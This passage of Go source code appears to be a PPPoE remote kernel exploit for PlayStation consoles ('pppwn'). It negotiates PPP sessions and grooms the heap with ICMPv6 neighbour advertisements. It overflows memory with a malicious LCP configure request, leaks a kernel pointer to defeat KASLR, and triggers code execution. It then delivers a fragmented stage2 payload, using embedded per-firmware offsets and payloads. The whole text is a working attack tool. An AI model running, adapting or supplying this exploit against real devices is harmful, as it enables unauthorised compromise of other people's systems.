	fmt.Println("[*] Sending IPCP configure NAK...")
	e.SendPacket(pkt)

	fmt.Println("[*] Waiting for IPCP configure request...")
	currentPacket = e.GetPPPPacketWithIPCPCode(layers.IPCP_CONF_REQUEST)
	e.LogRecvPacket(currentPacket)

	packetIPCP = currentPacket.Layer(layers.LayerTypePPPIPCP)
	req_identifier = packetIPCP.(*layers.PPPIPCP).Identifier
	conf_options := packetIPCP.(*layers.PPPIPCP).Options

	pkt, err = PpoeIPCP(e.sourceMAC, e.targetMAC, SESSION_ID, layers.IPCP_CONF_ACK, req_identifier, conf_options)
	if err != nil {
		log.Println("[-] Error crafting packet:", err)
		return
	}

	fmt.Println("[*] Sending IPCP configure ACK...")
	e.SendPacket(pkt)
}

func (e *Exploit) Run(padi_pkt gopacket.Packet) bool {
	fmt.Printf("[+] Running exploit on %s\n", e.socket.GetDevice())

	go NewLcpEchoHandler(e.socket.GetDevice())

	fmt.Println("[+] STAGE 0: Initialization")

	var build_cookie BuildCookie = e.buildFakeIfnet
	e.PppNegotation(build_cookie)
	e.LcpNegociation()
	e.IpcpNegociation()

	fmt.Println("[*] Waiting for interface to be ready...")

	currentPacket := e.GetPacketWithTypes(layers.LayerTypeICMPv6RouterSolicitation)
	e.LogRecvPacket(currentPacket)

	e.targetIPv6 = currentPacket.Layer(layers.LayerTypeIPv6).(*layers.IPv6).SrcIP
	fmt.Printf("[+] Target IPv6: %s\n", e.targetIPv6)

	for i := 0; i < SPRAY_NUM; i++ {
		if i%0x100 == 0 {
			fmt.Printf("[*] Heap grooming...%d%%\r", int(100*i/SPRAY_NUM))
			os.Stdout.Sync()
		}

		source_ipv6 := net.ParseIP(fmt.Sprintf("fe80::%04x:4141:4141:4141", i)).To16()
		ethLayer := &layers.Ethernet{
			SrcMAC:       e.sourceMAC,
			DstMAC:       e.targetMAC,
			EthernetType: layers.EthernetTypeIPv6,
		}

		ipv6Layer := &layers.IPv6{
			Version:    6,
			NextHeader: layers.IPProtocolICMPv6,
			HopLimit:   64,
			SrcIP:      source_ipv6,
			DstIP:      e.targetIPv6,
		}

		echoRequest := &layers.ICMPv6Echo{
			TypeCode:   layers.CreateICMPv6TypeCode(layers.ICMPv6TypeEchoRequest, 0),
			Identifier: 0x0,
			SeqNumber:  0x0,
		}
		echoRequest.SetNetworkLayerForChecksum(ipv6Layer)

		pkt, err := SerializeLayers(ethLayer, ipv6Layer, echoRequest)
		if err != nil {
			fmt.Println("[-] Error crafting packet:", err)
			return false
		}
		e.SendPacket(pkt)

		currentPacket = e.GetPacketWithTypes(layers.LayerTypeICMPv6NeighborSolicitation)
		e.LogRecvPacket(currentPacket)

		if i >= HOLE_START && i%HOLE_SPACE == 0 {
			continue
		}

		ethLayer = &layers.Ethernet{
			SrcMAC:       e.sourceMAC,
			DstMAC:       e.targetMAC,
			EthernetType: layers.EthernetTypeIPv6,
		}

		ipv6Layer = &layers.IPv6{
			Version:    6,
			NextHeader: layers.IPProtocolICMPv6,
			HopLimit:   255,
			SrcIP:      source_ipv6,
			DstIP:      e.targetIPv6,
		}

		ipv6NeighborDiscovery := &layers.ICMPv6NeighborAdvertisement{
			TypeCode:      layers.CreateICMPv6TypeCode(layers.ICMPv6TypeNeighborAdvertisement, 0),
			TargetAddress: source_ipv6,
			Flags:         0x80 | 0x40 | 0x20, // Override, Solicited, Router\
			Options: layers.ICMPv6Options{
				layers.NewIPv6AddressOption(e.sourceMAC),
			},
		}
		ipv6NeighborDiscovery.SetNetworkLayerForChecksum(ipv6Layer)

		pkt, err = SerializeLayers(ethLayer, ipv6Layer, ipv6NeighborDiscovery)
		if err != nil {
			fmt.Println("[-] Error crafting packet:", err)
			return false
		}
		e.SendPacket(pkt)

		if i%4 == 0 {
			time.Sleep(time.Millisecond * 1)
		}
	}

	fmt.Println("[+] Heap grooming...done")

	fmt.Println("[+] STAGE 1: Memory corruption")

	ethLayer := &layers.Ethernet{
		SrcMAC:       e.sourceMAC,
		DstMAC:       e.targetMAC,
		EthernetType: layers.EthernetTypePPPoESession,
	}

	pppoeLayer := &layers.PPPoE{
		Version:   1,
		Type:      1,
		SessionId: SESSION_ID,
		Length:    6,
	}

	pppLayer := &layers.PPP{
		PPPType: 0x4141,
	}

	pkt, err := SerializeLayers(ethLayer, pppoeLayer, pppLayer)
	if err != nil {
		fmt.Println("[-] Error crafting packet:", err)
		return false
	}
	pkt = pkt[:14]

	for i := 0; i < PIN_NUM; i++ {
		if i%0x100 == 0 {
			fmt.Printf("[*] Pinning to CPU 0...%d%%\r", int(100*i/PIN_NUM))
			os.Stdout.Sync()
		}

		e.SendPacket(pkt)

		time.Sleep(time.Millisecond * 1)
	}

	fmt.Println("[+] Pinning to CPU 0...done")

	time.Sleep(time.Second * 1)

	overflowLle := e.buildOverflowLle()
	for i := 0; i < CORRUPT_NUM; i++ {
		ethLayer := &layers.Ethernet{
			SrcMAC:       e.sourceMAC,
			DstMAC:       e.targetMAC,
			EthernetType: layers.EthernetTypePPPoESession,
		}

		pppoeLayer := &layers.PPPoE{
			Version:   1,
			Type:      1,
			SessionId: SESSION_ID,
			Length:    6,
		}

		pppLayer := &layers.PPP{
			PPPType: layers.PPPLinkControlProtocol,
		}

		pppLCP := &layers.PPPLCP{
			Code:       layers.LCP_CONF_REQUEST,
			Identifier: LCP_ID,
			Length:     TARGET_SIZE + 4,
			PPPLCPOptions: []layers.PPPLCPOption{
				{
					Data: BytesRepeat('A', (TARGET_SIZE - 4)),
				},
				{
					Data: overflowLle,
				},
			},
		}

		pkt, err := SerializeLayers(ethLayer, pppoeLayer, pppLayer, pppLCP)
		if err != nil {
			fmt.Println("[-] Error crafting packet:", err)
			return false
		}
		fmt.Printf("[*] Sending malicious LCP configure request...\n")
		e.SendPacket(pkt)
	}

	fmt.Println("[*] Waiting for LCP configure reject...")
	currentPacket = e.GetPPPPacketWithLCPCode(layers.LCP_CONF_REJECT)
	e.LogRecvPacket(currentPacket)

	// Re-negotiate after rejection
	e.LcpNegociation()
	e.IpcpNegociation()

	corrupted := false
	var source_ipv6 net.IP = nil
	for i := SPRAY_NUM - 1; i >= 0; i-- {
		if i%0x100 == 0 {
			fmt.Printf("[*] Scanning for corrupted object...%x\r", i)
			os.Stdout.Sync()
		}

		if i >= HOLE_START && i%HOLE_SPACE == 0 {
			continue
		}

		source_ipv6 = net.ParseIP(fmt.Sprintf("fe80::%04x:4141:4141:4141", i))

		ethLayer := &layers.Ethernet{
			SrcMAC:       e.sourceMAC,
			DstMAC:       e.targetMAC,
			EthernetType: layers.EthernetTypeIPv6,
		}

		ipv6Layer := &layers.IPv6{
			Version:    6,
			NextHeader: layers.IPProtocolICMPv6,
			HopLimit:   64,
			SrcIP:      source_ipv6,
			DstIP:      e.targetIPv6,
		}

		echoRequest := &layers.ICMPv6Echo{
			TypeCode:   layers.CreateICMPv6TypeCode(layers.ICMPv6TypeEchoRequest, 0),
			Identifier: 0x0,
			SeqNumber:  0x0,
		}
		echoRequest.SetNetworkLayerForChecksum(ipv6Layer)

		pkt, err := SerializeLayers(ethLayer, ipv6Layer, echoRequest)
		if err != nil {
			fmt.Println("[-] Error crafting packet:", err)
			return false
		}
		e.SendPacket(pkt)

		for {
			currentPacket := e.GetPacket()
			if currentPacket == nil {
				continue
			}
			a_layer := currentPacket.Layer(layers.LayerTypeICMPv6NeighborSolicitation)
			if a_layer != nil {
				corrupted = true
				e.LogRecvPacket(currentPacket)
				break
			}
			a_layer = currentPacket.Layer(layers.LayerTypeICMPv6Echo)
			if a_layer != nil {
				e.LogRecvPacket(currentPacket)
				break
			}
		}

		if corrupted {
			fmt.Printf("[+] Found corrupted object\n")
			break
		}

		ethLayer = &layers.Ethernet{
			SrcMAC:       e.sourceMAC,
			DstMAC:       e.targetMAC,
			EthernetType: layers.EthernetTypeIPv6,
		}

		ipv6Layer = &layers.IPv6{
			Version:    6,
			NextHeader: layers.IPProtocolICMPv6,
			HopLimit:   255,
			SrcIP:      source_ipv6,
			DstIP:      e.targetIPv6,
		}

		ipv6NeighborDiscovery := &layers.ICMPv6NeighborAdvertisement{
			TypeCode:      layers.CreateICMPv6TypeCode(layers.ICMPv6TypeNeighborAdvertisement, 0),
			TargetAddress: source_ipv6,
			Flags:         0x80 | 0x40 | 0x20, // Override, Solicited, Router
			Options: layers.ICMPv6Options{
				layers.NewIPv6AddressOption(e.sourceMAC),
			},
		}
		ipv6NeighborDiscovery.SetNetworkLayerForChecksum(ipv6Layer)

		pkt, err = SerializeLayers(ethLayer, ipv6Layer, ipv6NeighborDiscovery)
		if err != nil {
			fmt.Println("[-] Error crafting packet:", err)
			return false
		}
		e.SendPacket(pkt)
	}

	if !corrupted {
		fmt.Println("[-] Scanning for corrupted object...failed. Please retry.")
		return false
	}

	fmt.Printf("[+] Scanning for corrupted object...found %v\n\n", source_ipv6)

	fmt.Println("[+] STAGE 2: KASLR defeat")
	fmt.Println("[*] Defeating KASLR...")

	var pppoe_softc_list uint64

	currentPacket = e.GetPacketWithTypes(layers.LayerTypeICMPv6NeighborSolicitation)
	a_layer := currentPacket.Layer(layers.LayerTypeICMPv6NeighborSolicitation)
	icmpv6Ns := a_layer.(*layers.ICMPv6NeighborSolicitation)

	for _, opt := range icmpv6Ns.Options {
		if opt.Type == layers.ICMPv6OptSourceAddress && len(opt.Data) > 1 {
			if len(opt.Data) >= 9 {
				pppoe_softc_list = BytesToUint64(opt.Data[1:9])
				fmt.Printf("[+] pppoe_softc_list: 0x%x\n", pppoe_softc_list)
			}
			break
		}
	}

	e.kaslr_offset = pppoe_softc_list - e.offsets["PPPOE_SOFTC_LIST"]
	fmt.Printf("[+] kaslr_offset: 0x%x\n", e.kaslr_offset)

	if pppoe_softc_list&0xffffffff00000fff != e.offsets["PPPOE_SOFTC_LIST"]&0xffffffff00000fff {
		fmt.Println("[-] Error leak is invalid. Wrong firmware?")
		os.Exit(1)
	}
	e.LogRecvPacket(currentPacket)

	fmt.Println("[+] STAGE 3: Remote code execution")

	pkt, err = PpoeLCP(e.sourceMAC, e.targetMAC, SESSION_ID, layers.LCP_TERM_REQUEST, 0x0)
	if err != nil {
		fmt.Println("[-] Error crafting packet:", err)
		return false
	}
	fmt.Println("[*] Sending LCP terminate request...")
	e.SendPacket(pkt)

	e.PppNegotation(e.buildFakeLle)

	fmt.Println("[*] Triggering code execution...")

	ethLayer = &layers.Ethernet{
		SrcMAC:       e.sourceMAC,
		DstMAC:       e.targetMAC,
		EthernetType: layers.EthernetTypeIPv6,
	}

	ipv6Layer := &layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolICMPv6,
		HopLimit:   64,
		SrcIP:      net.ParseIP(SOURCE_IPV6),
		DstIP:      e.targetIPv6,
	}

	echoRequest := &layers.ICMPv6Echo{
		TypeCode:   layers.CreateICMPv6TypeCode(layers.ICMPv6TypeEchoRequest, 0),
		Identifier: 0x0,
		SeqNumber:  0x0,
	}
	echoRequest.SetNetworkLayerForChecksum(ipv6Layer)

	pkt, err = SerializeLayers(ethLayer, ipv6Layer, echoRequest)
	if err != nil {
		fmt.Println("[-] Error crafting packet:", err)
		return false
	}
	e.SendPacket(pkt)

	fmt.Println("[*] Waiting for stage1 to resume...")
	count := 0
	for count < 3 {
		currentPacket := e.GetPPPPacketWithLCPCode(layers.LCP_CONF_REQUEST)
		e.LogRecvPacket(currentPacket)
		count++
	}

	ethLayer = &layers.Ethernet{
		SrcMAC:       e.sourceMAC,
		DstMAC:       e.targetMAC,
		EthernetType: layers.EthernetTypePPPoEDiscovery,
	}

	pppoeLayer = &layers.PPPoE{
		Version:   1,
		Type:      1,
		SessionId: SESSION_ID,
		Code:      layers.PPPoECodePADT,
	}

	fmt.Println("[*] Sending PADT...")
	pkt, _ = SerializeLayers(ethLayer, pppoeLayer)
	e.SendPacket(pkt)

	e.PppNegotation(nil)
	e.LcpNegociation()
	e.IpcpNegociation()

	fmt.Println("[+] STAGE 4: Arbitrary payload execution")
	fmt.Println("[*] Sending stage2 payload...")

	ethLayer = &layers.Ethernet{
		SrcMAC:       e.sourceMAC,
		DstMAC:       e.targetMAC,
		EthernetType: layers.EthernetTypeIPv4,
	}

	udpLayer := &layers.UDP{
		SrcPort: 53,
		DstPort: STAGE2_PORT,
	}

	ipLayer := &layers.IPv4{
		Version:  4,
		Id:       1,
		SrcIP:    e.sourceIPv4,
		DstIP:    e.targetIPv4,
		Protocol: layers.IPProtocolUDP,
		TTL:      64,
		Flags:    layers.IPv4MoreFragments,
	}

	fragmentSize := 1024
	totalFragments := (len(e.stage2) + 8 + fragmentSize - 1) / fragmentSize

	offset := 0
	foffset := 0

	for i := 0; i < totalFragments; i++ {
		if i == totalFragments-1 {
			ipLayer.Flags = 0
		}

		ipLayer.FragOffset = uint16(foffset) / 8

		if i == 0 {
			var end int
			if (len(e.stage2) + 8) > fragmentSize {
				end = offset + fragmentSize - 8
			} else {
				end = len(e.stage2)
			}
			payload := gopacket.Payload(e.stage2[offset:end])
			offset = end
			foffset += len(payload) + 8
			udpLayer.Length = uint16(len(e.stage2)) + 8

			buffer := gopacket.NewSerializeBuffer()
			err := gopacket.SerializeLayers(buffer, gopacket.SerializeOptions{
				ComputeChecksums: false,
				FixLengths:       false,
			}, udpLayer)
			if err != nil {
				fmt.Printf("error serializing layers: %v", err)
			}

			pkt, err := SerializeLayers(ethLayer, ipLayer, gopacket.Payload(buffer.Bytes()), payload)
			if err != nil {
				fmt.Println("[-] Error serializing layers:", err)
				return false
			}
			fmt.Printf("[*] Sending fragment %d/%d...\n", i+1, totalFragments)
			e.SendPacket(pkt)
		} else {
			var end int
			if (len(e.stage2) - offset) > fragmentSize {
				end = offset + fragmentSize
			} else {
				end = len(e.stage2)
			}
			payload := gopacket.Payload(e.stage2[offset:end])
			offset = end
			foffset += len(payload)
			pkt, err := SerializeLayers(ethLayer, ipLayer, payload)
			if err != nil {
				fmt.Println("[-] Error converting packet to bytes:", err)
				return false
			}
			fmt.Printf("[*] Sending fragment %d/%d...\n", i+1, totalFragments)
			e.SendPacket(pkt)
		}
	}

	fmt.Println("[+] Done!")
	e.socket.Close()

	return true
}

func GetRealInterfaceName(n string) (string, error) {
	devices, err := pcap.FindAllDevs()
	if err != nil {
		fmt.Println("[-] Error finding devices:", err)
		return "", err
	}

	for _, device := range devices {
		if len(device.Addresses) == 0 {
			continue
		}

		for _, address := range device.Addresses {
			if address.IP.String() == n {
				return device.Name, nil
			}
		}
	}
	return n, nil
}

type LogEntry struct {
	Type string `json:"type"`
	Data []byte `json:"data"`
}

func main() {
	parser := argparse.NewParser("pppwn", "PlayStation 4 PPPoE RCE ")

	fwArg := parser.String("f", "fw", &argparse.Options{Default: "1050", Help: "PS5 FW version to exploit (e.g. 1100)"})
	debugArg := parser.String("D", "debug", &argparse.Options{Default: nil, Help: "Specify a path to a file to log packets to"})
	stage1Arg := parser.String("s", "stage1", &argparse.Options{Default: nil, Help: "Path to stage1 payload (Use embedded if not specified)"})
	stage2Arg := parser.String("S", "stage2", &argparse.Options{Default: nil, Help: "Path to stage2 payload (Use embedded if not specified)"})

	err := parser.Parse(os.Args)
	if err != nil {
		fmt.Print(parser.Usage(err))
		return
	}

	offsets_file, err := Asset(fmt.Sprintf("embedded/%s.json", *fwArg))
	if err != nil {
		fmt.Printf("[-] Unknown offset for fw: %s\n", *fwArg)
		os.Exit(1)
	}
	offsets, err := LoadJsonOffset(offsets_file)
	if err != nil {
		fmt.Println("[-] Error loading offsets:", err)
		os.Exit(1)
	}
	fmt.Printf("[+] Loaded offsets for firmware version %s\n", *fwArg)

	var stage1 []byte
	fmt.Printf("[+] Loading stage1 payload... %v\n", *stage1Arg)
	if *stage1Arg == "" {
		stage1, err = Asset(fmt.Sprintf("embedded/stage1_%s.bin", *fwArg))
		if err != nil {
			fmt.Println("[-] Error reading stage1:", err)
			os.Exit(1)
		}
	} else {
		stage1, err = os.ReadFile(*stage1Arg)
		if err != nil {
			fmt.Println("[-] Error reading stage1:", err)
			os.Exit(1)
		}
	}

	var stage2 []byte
	fmt.Printf("[+] Loading stage2 payload... %v\n", *stage1Arg)
	if *stage2Arg == "" {
		stage2, err = Asset(fmt.Sprintf("embedded/stage2_%s.bin", *fwArg))
		if err != nil {
			fmt.Println("[-] Error reading stage2:", err)
			os.Exit(1)
		}
	} else {
		stage2, err = os.ReadFile(*stage2Arg)
		if err != nil {
			fmt.Println("[-] Error reading stage2:", err)
			os.Exit(1)
		}
	}

	iface, padi_pkt := guessRightInterface()

	ihandle, err := pcap.NewInactiveHandle(iface)
	if err != nil {
		fmt.Println("[-] Error creating handle:", err)
	}
	ihandle.SetImmediateMode(true)
	ihandle.SetPromisc(true)
	writer, err := ihandle.Activate()
	if err != nil {
		fmt.Println("[-] Error activating listening:", err)
		os.Exit(1)
	}
	writer.SetBPFFilter(BPF_FILTER)
	writer.SetDirection(pcap.DirectionIn)
	if err != nil {
		fmt.Println("[-] Error creating writing socket:", err)
	}

	exploit := NewExploit(writer, stage1, stage2, offsets, *debugArg != "")
	if exploit.Run(padi_pkt) {
		fmt.Println("[+] Exploit succeeded")
	} else {
		fmt.Println("[-] Exploit failed")
	}

	if *debugArg != "" {
		jsonData, err := json.MarshalIndent(exploit.packets, "", "    ")
		if err != nil {
			fmt.Println("[-] Error marshaling JSON:", err)
			return
		}

		file, err := os.Create(*debugArg)
		if err != nil {
			fmt.Println("[-] Error creating file:", err)
			return
		}
		defer file.Close()

		_, err = file.Write(jsonData)
		if err != nil {
			fmt.Println("[-] Error writing to file:", err)
			return
		}
	}
}
